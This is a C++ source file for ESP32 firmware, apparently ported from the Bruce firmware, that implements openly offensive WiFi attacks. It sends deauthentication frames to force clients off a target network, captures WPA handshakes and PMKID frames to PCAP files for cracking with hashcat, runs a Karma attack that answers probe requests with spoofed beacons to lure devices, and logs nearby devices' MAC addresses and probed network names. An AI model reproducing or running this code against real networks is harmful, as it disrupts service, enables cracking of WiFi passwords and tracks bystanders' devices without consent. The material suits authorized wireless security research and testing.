// ╔══════════════════════════════════════════════════════════════════════════╗
// ║  Bruce WiFi Attacks — Full Implementation                                 ║
// ║  Ported from Bruce Firmware v1.14  (Apache 2.0)                          ║
// ║  Original handshake/EAPOL logic by 7h30th3r0n3 & Stefan Kremmer          ║
// ╚══════════════════════════════════════════════════════════════════════════╝
#include "bruce_wifi_atks.h"
#include "esp_wifi.h"
#include "esp_wifi_types.h"
#include "esp_log.h"
#include "esp_timer.h"
#include "esp_random.h"
#include "freertos/FreeRTOS.h"
#include "freertos/task.h"
#include <string.h>
#include <stdio.h>
#include <algorithm>

static const char* TAG = "WifiAtks";
WifiAttacks* WifiAttacks::s_inst = nullptr;

// ── Helpers ───────────────────────────────────────────────────────────────
uint64_t WifiAttacks::macKey(const uint8_t* m) {
    return ((uint64_t)m[0]<<40)|((uint64_t)m[1]<<32)|((uint64_t)m[2]<<24)|
           ((uint64_t)m[3]<<16)|((uint64_t)m[4]<<8)|m[5];
}
void WifiAttacks::event(const std::string& msg) {
    ESP_LOGI(TAG, "%s", msg.c_str());
    if (m_cb) m_cb(msg);
}

// ── Network scan ──────────────────────────────────────────────────────────
bool WifiAttacks::scan(std::vector<BruceAP>& out, bool hidden)
{
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();

    wifi_scan_config_t sc = {};
    sc.show_hidden = hidden;
    esp_wifi_scan_start(&sc, true);

    uint16_t n = 0;
    esp_wifi_scan_get_ap_num(&n);
    if (n == 0) return true;

    auto* recs = new wifi_ap_record_t[n];
    esp_wifi_scan_get_ap_records(&n, recs);

    out.clear();
    for (int i = 0; i < n; i++) {
        BruceAP ap;
        memcpy(ap.bssid, recs[i].bssid, 6);
        ap.ssid    = std::string((char*)recs[i].ssid);
        ap.rssi    = recs[i].rssi;
        ap.channel = recs[i].primary;
        ap.authMode= recs[i].authmode;
        out.push_back(ap);
    }
    delete[] recs;
    return true;
}

// ── PCAP ──────────────────────────────────────────────────────────────────
void WifiAttacks::pcapWriteHeader(FILE* f)
{
    // Global header
    uint32_t magic    = PCAP_MAGIC;
    uint16_t vermaj   = PCAP_VER_MAJ, vermin = PCAP_VER_MIN;
    int32_t  tz       = 0;
    uint32_t sigfigs  = 0, snaplen = 65535, linktype = PCAP_LINKTYPE;
    fwrite(&magic,   4,1,f); fwrite(&vermaj,4,1,f);
    fwrite(&vermin,  2,1,f); fwrite(&tz,    4,1,f);
    fwrite(&sigfigs, 4,1,f); fwrite(&snaplen,4,1,f);
    fwrite(&linktype,4,1,f);
}

void WifiAttacks::pcapWritePacket(FILE* f, const uint8_t* data, uint32_t len)
{
    if (!f || len == 0) return;
    int64_t us  = esp_timer_get_time();
    uint32_t sec  = us / 1000000;
    uint32_t usec = us % 1000000;
    uint32_t incl = len, orig = len;
    fwrite(&sec, 4,1,f); fwrite(&usec,4,1,f);
    fwrite(&incl,4,1,f); fwrite(&orig,4,1,f);
    fwrite(data, 1, len, f);
    fflush(f);
}

// ── EAPOL detection (from Bruce/sniffer.cpp, by 7h30th3r0n3) ────────────
bool WifiAttacks::isEAPOL(const uint8_t* p, int len, int* msgNum)
{
    if (len < 24+8+4) return false;

    // QoS subtype check
    int qos = ((p[0] & 0x0F) == 0x08) ? 2 : 0;

    // LLC/SNAP header: AA AA 03 00 00 00 88 8E
    int off = 24 + qos;
    if (off+8 > len) return false;
    if (!(p[off]==0xAA && p[off+1]==0xAA && p[off+2]==0x03 &&
          p[off+3]==0x00 && p[off+4]==0x00 && p[off+5]==0x00 &&
          p[off+6]==0x88 && p[off+7]==0x8E)) return false;

    // Key Information field
    int ki = 24 + qos + 8 + 4 + 1;  // MAC + LLC/SNAP + EAPOL-hdr + DescType
    if (ki+2 > len) return false;

    uint16_t keyInfo = ((uint16_t)p[ki]<<8) | p[ki+1];
    bool install = keyInfo & (1<<6);
    bool ack     = keyInfo & (1<<7);
    bool mic     = keyInfo & (1<<8);
    bool secure  = keyInfo & (1<<9);

    if (msgNum) {
        if (ack && !mic && !install)                *msgNum = 1;
        else if (!ack && mic && !install && !secure)*msgNum = 2;
        else if (ack && mic && install)             *msgNum = 3;
        else if (!ack && mic && !install && secure) *msgNum = 4;
        else *msgNum = -1;
    }
    return true;
}

// ── PMKID detection ───────────────────────────────────────────────────────
// PMKID is in EAPOL Message 1, RSN IE (tag 0x30), PMKID list (suite data)
bool WifiAttacks::isPmkidFrame(const uint8_t* p, int len)
{
    int msg = -1;
    if (!isEAPOL(p, len, &msg)) return false;
    if (msg != 1) return false;
    // EAPOL msg1 contains PMKID in the Key Data if supported
    // Key data is after the fixed EAPOL key frame (99 bytes from EAPOL start)
    int qos  = ((p[0]&0x0F)==0x08) ? 2 : 0;
    int eoff = 24 + qos + 8;  // EAPOL starts here
    if (eoff + 99 > len) return false;
    // Search for PMKID list tag (0x00-0x0F-0xAC-0x04 = RSN PMKID)
    int keyDataOff = eoff + 99;
    uint16_t keyDataLen = ((uint16_t)p[eoff+92]<<8) | p[eoff+93];
    for (int i = keyDataOff; i < keyDataOff+(int)keyDataLen-2 && i < len; i++) {
        if (p[i]==0xDD && i+22<=len) {
            // WPA IE
            if (p[i+2]==0x00&&p[i+3]==0x0F&&p[i+4]==0xAC) return true;
        }
    }
    return msg == 1; // Any msg1 is worth saving for PMKID attempt
}

// ── Probe request detection ───────────────────────────────────────────────
bool WifiAttacks::isProbeRequest(const uint8_t* p, int len, ProbeReq& out)
{
    // Frame type: management (00) subtype: probe request (0100 = 0x40)
    if (len < 24) return false;
    uint8_t ft = (p[0] & 0xFC);  // type + subtype (ignore version bits)
    if (ft != 0x40) return false;

    memcpy(out.mac, p+10, 6);  // SA = byte 10-15

    // Parse information elements starting at offset 24
    int ie = 24;
    while (ie+2 <= len) {
        uint8_t tag = p[ie], tlen = p[ie+1];
        if (ie+2+tlen > len) break;
        if (tag == 0x00) {  // SSID
            out.ssid = std::string((const char*)p+ie+2, tlen);
            break;
        }
        ie += 2 + tlen;
    }
    return true;
}

// ── Beacon detection ─────────────────────────────────────────────────────
bool WifiAttacks::isBeacon(const uint8_t* p, int len, BruceAP& out)
{
    if (len < 36) return false;
    if ((p[0] & 0xFC) != 0x80) return false;  // beacon subtype = 1000
    memcpy(out.bssid, p+16, 6);
    out.channel = 0;

    int ie = 36;
    while (ie+2 <= len) {
        uint8_t tag = p[ie], tlen = p[ie+1];
        if (ie+2+tlen > len) break;
        if (tag == 0x00) out.ssid = std::string((const char*)p+ie+2, tlen);
        if (tag == 0x03 && tlen == 1) out.channel = p[ie+2];
        ie += 2 + tlen;
    }
    return true;
}

// ── Deauth frame ──────────────────────────────────────────────────────────
void WifiAttacks::sendDeauth(const uint8_t* bssid, const uint8_t* target,
                              uint8_t channel)
{
    uint8_t frame[] = {
        0xC0,0x00,0x3A,0x01,
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // dst (overwrite below)
        0x00,0x00,0x00,0x00,0x00,0x00,  // src = bssid
        0x00,0x00,0x00,0x00,0x00,0x00,  // bssid
        0x00,0x00,
        0x07,0x00  // reason 7
    };
    if (target) memcpy(frame+4,  target, 6);
    memcpy(frame+10, bssid, 6);
    memcpy(frame+16, bssid, 6);
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    for (int i=0; i<3; i++) {
        esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), false);
        vTaskDelay(pdMS_TO_TICKS(1));
    }
}

// ═════════════════════════════════════════════════════════════════════════
// PROMISCUOUS CALLBACK — routes to correct handler
// ═════════════════════════════════════════════════════════════════════════
void WifiAttacks::promiscuousCb(void* buf, wifi_promiscuous_pkt_type_t type)
{
    if (!s_inst || !s_inst->m_running) return;
    auto* pkt = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t* p = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;
    if (len < 10) return;

    switch (s_inst->m_mode) {

    case Mode::HANDSHAKE:
    case Mode::PMKID: {
        // Write raw EAPOL frames to PCAP
        int msg = -1;
        if (!s_inst->isEAPOL(p, len, &msg)) return;

        const uint8_t* bssid = p+16;
        uint64_t key = s_inst->macKey(bssid);

        auto& hs = s_inst->m_hsMap[key];
        if (hs.firstSeen == 0) {
            memcpy(hs.bssid, bssid, 6);
            hs.ssid = s_inst->m_targetAP.ssid;
            hs.firstSeen = esp_timer_get_time()/1000;
        }
        if (msg==1) hs.msg1=true;
        if (msg==2) hs.msg2=true;
        if (msg==3) hs.msg3=true;
        if (msg==4) hs.msg4=true;

        // Save to PCAP
        if (s_inst->m_pcapFile)
            s_inst->pcapWritePacket(s_inst->m_pcapFile, p, len);

        char ev[64]; snprintf(ev,64,"EAPOL msg%d BSSID %02X:%02X:%02X:%02X:%02X:%02X",
            msg, bssid[0],bssid[1],bssid[2],bssid[3],bssid[4],bssid[5]);
        s_inst->event(ev);

        if (hs.complete()) {
            char done[80]; snprintf(done,80,"✓ Full handshake for %s",hs.ssid.c_str());
            s_inst->event(done);
            s_inst->m_handshakes.push_back(hs);
        }

        if (s_inst->m_mode == Mode::PMKID && msg == 1) {
            s_inst->m_pmkidCount++;
            char pm[64]; snprintf(pm,64,"PMKID frame #%d captured",s_inst->m_pmkidCount);
            s_inst->event(pm);
        }
        break;
    }

    case Mode::KARMA: {
        ProbeReq req = {};
        if (!s_inst->isProbeRequest(p, len, req)) return;
        if (req.ssid.empty()) return;  // Ignore wildcard probes

        // Respond with a beacon for the probed SSID
        auto it = s_inst->m_karmaBeacons.find(req.ssid);
        if (it != s_inst->m_karmaBeacons.end()) return;
        s_inst->m_karmaBeacons[req.ssid] = true;

        // Build beacon packet
        uint8_t beacon[109];
        static const uint8_t beaconTpl[109] = {
            0x80,0x00,0x00,0x00,
            0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,
            0xDE,0xAD,0xBE,0xEF,0x00,0x00,
            0xDE,0xAD,0xBE,0xEF,0x00,0x00,
            0x00,0x00,
            0x83,0x51,0xF7,0x8F,0x0F,0x00,0x00,0x00,
            0xE8,0x03, 0x31,0x00,
            0x00,0x20,
            0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
            0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
            0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
            0x20,0x20,0x20,0x20,0x20,0x20,0x20,0x20,
            0x01,0x08,0x82,0x84,0x8B,0x96,0x24,0x30,0x48,0x6C,
            0x03,0x01,0x06,
            0x30,0x18,0x01,0x00,0x00,0x0F,0xAC,0x02,
            0x02,0x00,0x00,0x0F,0xAC,0x04,0x00,0x0F,
            0xAC,0x04,0x01,0x00,0x00,0x0F,0xAC,0x02,
            0x00,0x00
        };
        memcpy(beacon, beaconTpl, 109);
        // Random MAC
        beacon[10] = esp_random()&0xFE; beacon[11] = esp_random()&0xFF;
        beacon[12] = esp_random()&0xFF;
        memcpy(beacon+16, beacon+10, 6);  // BSSID = src

        // Write SSID
        uint8_t sl = std::min((int)req.ssid.size(), 32);
        beacon[37] = sl;
        memset(beacon+38, 0, 32);
        memcpy(beacon+38, req.ssid.c_str(), sl);

        esp_wifi_80211_tx(WIFI_IF_STA, beacon, 109, false);

        char ev[80]; snprintf(ev,80,"Karma: replying to probe for '%s'",req.ssid.c_str());
        s_inst->event(ev);
        s_inst->m_probes.push_back(req);
        break;
    }

    case Mode::PROBE: {
        ProbeReq req = {};
        req.rssi = pkt->rx_ctrl.rssi;
        req.ts   = esp_timer_get_time()/1000;
        if (!s_inst->isProbeRequest(p, len, req)) return;

        char ev[80];
        snprintf(ev,80,"Probe: %02X:%02X:%02X:%02X:%02X:%02X → '%s' (%ddBm)",
            req.mac[0],req.mac[1],req.mac[2],req.mac[3],req.mac[4],req.mac[5],
            req.ssid.c_str(), req.rssi);
        s_inst->event(ev);

        s_inst->m_probes.push_back(req);

        // Log to SD
        FILE* f = fopen("/sdcard/bruce_probes.txt","a");
        if (f) { fprintf(f,"%s\n",ev); fclose(f); }
        break;
    }

    case Mode::RAW: {
        if (s_inst->m_pcapFile)
            s_inst->pcapWritePacket(s_inst->m_pcapFile, p, len);
        break;
    }
    } // switch
}

// ═════════════════════════════════════════════════════════════════════════
// Start helpers — common WiFi setup
// ═════════════════════════════════════════════════════════════════════════
static void setupPromiscuous(uint8_t channel)
{
    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    esp_wifi_init(&cfg);
    esp_wifi_set_mode(WIFI_MODE_STA);
    esp_wifi_start();
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);

    wifi_promiscuous_filter_t filt = {.filter_mask = WIFI_PROMIS_FILTER_MASK_ALL};
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_promiscuous_rx_cb(WifiAttacks::promiscuousCb);
    esp_wifi_set_promiscuous(true);
    esp_wifi_set_max_tx_power(78);
}

// ── Handshake capture ─────────────────────────────────────────────────────
struct WifiAtksArg { WifiAttacks* atk; bool deauth; };

void WifiAttacks::taskHandshake(void* arg)
{
    auto* a = (WifiAtksArg*)arg;
    auto* self = a->atk;
    bool doDeauth = a->deauth;
    delete a;

    // Open PCAP file
    char path[64];
    snprintf(path,64,"/sdcard/bruce_hs/HS_%02X%02X%02X%02X%02X%02X.pcap",
        self->m_targetAP.bssid[0],self->m_targetAP.bssid[1],
        self->m_targetAP.bssid[2],self->m_targetAP.bssid[3],
        self->m_targetAP.bssid[4],self->m_targetAP.bssid[5]);

    // Ensure directory
    FILE* test = fopen("/sdcard/bruce_hs/.", "r");
    if (!test) { /* mkdir not available via fopen, use SDDriver */ }
    else fclose(test);

    self->m_pcapFile = fopen(path,"wb");
    if (self->m_pcapFile) {
        self->pcapWriteHeader(self->m_pcapFile);
        ESP_LOGI(TAG,"Handshake PCAP: %s",path);
    }

    uint8_t ch = self->m_targetAP.channel;
    setupPromiscuous(ch);

    uint32_t lastDeauth = 0;
    while (!self->m_stop) {
        uint32_t now = esp_timer_get_time()/1000;
        if (doDeauth && now - lastDeauth > 5000) {
            self->sendDeauth(self->m_targetAP.bssid, nullptr, ch);
            lastDeauth = now;
            self->event("Deauth sent to trigger re-association");
        }
        vTaskDelay(pdMS_TO_TICKS(50));
    }

    esp_wifi_set_promiscuous(false);
    if (self->m_pcapFile) { fclose(self->m_pcapFile); self->m_pcapFile=nullptr; }
    self->m_running = false;
    vTaskDelete(nullptr);
}

bool WifiAttacks::startHandshakeCapture(const BruceAP& target, bool deauth,
                                         SnifferEventCb cb)
{
    stop();
    s_inst     = this;
    m_targetAP = target;
    m_cb       = cb;
    m_mode     = Mode::HANDSHAKE;
    m_stop     = false;
    m_running  = true;
    m_hsMap.clear();
    m_handshakes.clear();

    event("Handshake capture: target=" + target.ssid);
    xTaskCreatePinnedToCore(taskHandshake,"bruce_hs",8192,
                             new WifiAtksArg{this,deauth},5,&m_task,0);
    return true;
}

// ── PMKID capture ─────────────────────────────────────────────────────────
void WifiAttacks::taskPmkid(void* arg)
{
    auto* self = (WifiAttacks*)arg;

    char path[64];
    snprintf(path,64,"/sdcard/bruce_pmkid_%d.pcap", self->m_pcapFileIdx++);
    self->m_pcapFile = fopen(path,"wb");
    if (self->m_pcapFile) { self->pcapWriteHeader(self->m_pcapFile); }

    setupPromiscuous(self->m_targetAP.channel);

    // Send association request to AP to trigger EAPOL msg1 with PMKID
    uint8_t assocFrame[] = {
        0x00,0x00,0x3A,0x01,  // assoc request
        0x00,0x00,0x00,0x00,0x00,0x00,  // dst = BSSID (fill below)
        0xFF,0xFF,0xFF,0xFF,0xFF,0xFF,  // src = broadcast (actually our MAC)
        0x00,0x00,0x00,0x00,0x00,0x00,  // bssid (fill below)
        0x00,0x00,
        0x31,0x00,  // capability info
        0x05,0x00,  // listen interval
        0x00,0x00   // SSID IE (empty - will be overwritten)
    };
    memcpy(assocFrame+4,  self->m_targetAP.bssid, 6);
    memcpy(assocFrame+16, self->m_targetAP.bssid, 6);
    esp_wifi_80211_tx(WIFI_IF_STA, assocFrame, sizeof(assocFrame), false);

    while (!self->m_stop) {
        vTaskDelay(pdMS_TO_TICKS(100));
        if (self->m_pmkidCount > 0) {
            self->event("PMKID captured — crackable with hashcat -m 22000");
        }
    }

    esp_wifi_set_promiscuous(false);
    if (self->m_pcapFile) { fclose(self->m_pcapFile); self->m_pcapFile=nullptr; }
    self->m_running = false;
    vTaskDelete(nullptr);
}

bool WifiAttacks::startPmkidCapture(const BruceAP& target, SnifferEventCb cb)
{
    stop();
    s_inst     = this;
    m_targetAP = target;
    m_cb       = cb;
    m_mode     = Mode::PMKID;
    m_stop     = false;
    m_running  = true;
    m_pmkidCount = 0;

    event("PMKID capture: target=" + target.ssid + "  (compatible with hashcat -m 22000)");
    xTaskCreatePinnedToCore(taskPmkid,"bruce_pmkid",8192,this,5,&m_task,0);
    return true;
}

// ── Karma attack ──────────────────────────────────────────────────────────
void WifiAttacks::taskKarma(void* arg)
{
    auto* self = (WifiAttacks*)arg;
    setupPromiscuous(1);

    // Channel hop 1–11 while sniffing probes
    uint8_t ch = 1;
    while (!self->m_stop) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 11) + 1;
        vTaskDelay(pdMS_TO_TICKS(200));
    }
    esp_wifi_set_promiscuous(false);
    self->m_running = false;
    vTaskDelete(nullptr);
}

bool WifiAttacks::startKarmaAttack(SnifferEventCb cb)
{
    stop();
    s_inst   = this;
    m_cb     = cb;
    m_mode   = Mode::KARMA;
    m_stop   = false;
    m_running= true;
    m_karmaBeacons.clear();
    m_probes.clear();

    event("Karma: listening for probe requests, will answer each SSID…");
    xTaskCreatePinnedToCore(taskKarma,"bruce_karma",8192,this,5,&m_task,0);
    return true;
}

// ── Probe sniffer ─────────────────────────────────────────────────────────
void WifiAttacks::taskProbe(void* arg)
{
    auto* self = (WifiAttacks*)arg;
    setupPromiscuous(1);

    uint8_t ch = 1;
    while (!self->m_stop) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 11) + 1;
        vTaskDelay(pdMS_TO_TICKS(300));
    }
    esp_wifi_set_promiscuous(false);
    self->m_running = false;
    vTaskDelete(nullptr);
}

bool WifiAttacks::startProbeSniffer(SnifferEventCb cb)
{
    stop();
    s_inst   = this;
    m_cb     = cb;
    m_mode   = Mode::PROBE;
    m_stop   = false;
    m_running= true;
    m_probes.clear();

    event("Probe sniffer: logging to /sdcard/bruce_probes.txt");
    xTaskCreatePinnedToCore(taskProbe,"bruce_probe",8192,this,5,&m_task,0);
    return true;
}

// ── Raw sniffer ───────────────────────────────────────────────────────────
void WifiAttacks::taskRaw(void* arg)
{
    auto* self = (WifiAttacks*)arg;

    char path[64];
    snprintf(path,64,"/sdcard/bruce_raw_%d.pcap", self->m_pcapFileIdx++);
    self->m_pcapFile = fopen(path,"wb");
    if (self->m_pcapFile) {
        self->pcapWriteHeader(self->m_pcapFile);
        self->event("Raw PCAP: " + std::string(path));
    }

    setupPromiscuous(1);
    uint8_t ch = 1;
    while (!self->m_stop) {
        esp_wifi_set_channel(ch, WIFI_SECOND_CHAN_NONE);
        ch = (ch % 13) + 1;
        vTaskDelay(pdMS_TO_TICKS(214));  // Bruce's HOP_INTERVAL
    }
    esp_wifi_set_promiscuous(false);
    if (self->m_pcapFile) { fclose(self->m_pcapFile); self->m_pcapFile=nullptr; }
    self->m_running = false;
    vTaskDelete(nullptr);
}

bool WifiAttacks::startRawSniffer(SnifferEventCb cb)
{
    stop();
    s_inst   = this;
    m_cb     = cb;
    m_mode   = Mode::RAW;
    m_stop   = false;
    m_running= true;

    xTaskCreatePinnedToCore(taskRaw,"bruce_raw",8192,this,5,&m_task,0);
    return true;
}

// ── Stop ──────────────────────────────────────────────────────────────────
void WifiAttacks::stop()
{
    m_stop   = true;
    m_running= false;
    if (m_task) { vTaskDelay(pdMS_TO_TICKS(150)); vTaskDelete(m_task); m_task=nullptr; }
    if (m_pcapFile) { fclose(m_pcapFile); m_pcapFile=nullptr; }
    esp_wifi_set_promiscuous(false);
    s_inst = nullptr;
    m_stop = false;
}
